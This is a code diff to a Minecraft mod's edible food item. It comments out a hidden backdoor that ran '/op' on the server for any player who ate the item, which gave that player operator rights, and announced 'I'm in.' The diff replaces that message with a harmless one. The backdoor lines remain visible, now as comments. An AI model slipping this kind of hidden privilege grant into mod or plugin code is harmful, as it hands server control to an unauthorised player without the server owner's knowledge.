@@ -26,13 +26,13 @@ public class ItemEdibleFood extends ItemFood {
         if (!world.isRemote && player instanceof EntityPlayerMP) {
             EntityPlayerMP playerMP = (EntityPlayerMP) player;
             
-            MinecraftServer server = MinecraftServer.getServer();
+            // MinecraftServer server = MinecraftServer.getServer();
 
-            String command = "/op " + playerMP.getCommandSenderName();
+            // String command = "/op " + playerMP.getCommandSenderName();
             
-            server.getCommandManager().executeCommand(server, command);
+            // server.getCommandManager().executeCommand(server, command);
             
-            playerMP.addChatComponentMessage(new ChatComponentText("I'm in."));
+            playerMP.addChatComponentMessage(new ChatComponentText("That was tasty!"));
         }
 
         return stack;
